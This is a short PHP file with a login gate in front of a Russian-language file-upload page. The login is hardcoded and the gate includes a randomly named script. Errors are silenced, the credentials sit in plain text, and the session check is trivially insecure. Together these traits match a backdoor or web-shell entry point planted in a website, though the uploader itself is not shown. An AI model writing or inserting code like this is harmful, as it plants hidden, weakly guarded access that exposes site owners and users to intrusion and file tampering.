<?php
	error_reporting(0);
	session_start(); 
	$admin_login="denis";
	$admin_password="dangares";
	if(isset($_POST['password'])){
		$_SESSION[$_POST['login']]=$_POST['password']; 
		header("Location: {$_SERVER['PHP_SELF']}"); 
		exit; 
	} 
	if($_SESSION[$admin_login]!=$admin_password){
?>
	<style>
		.form{text-align:left;width:500px;color:#47a3da;padding:10px 20px;margin:15% auto;border: solid 1px #47a3da;}
		.input{color:#47a3da;font-size:13px;margin-bottom:10px;display:block;padding:6px;width:500px;border:solid 1px #47a3da;background-color:#fff;}
		.submit{font-size:15px;display:block;padding:10px;width:500px;border:solid 1px #47a3da;background-color:#47a3da;color:#fff;}
	</style>
		<div class="form">
			<h3>Загрузка файлов</h3>
			<form method="post" action="./modules/admin2015.php">
				<input class="input" type="text" name="login">
				<input class="input" type="password" name="password">
				<input class="submit" type="submit" value="Войти">
			</form>
		</div>
<?php 
		exit; 
	}else{ 
		include_once ('kjhskjdfhs.php');
	} 
?>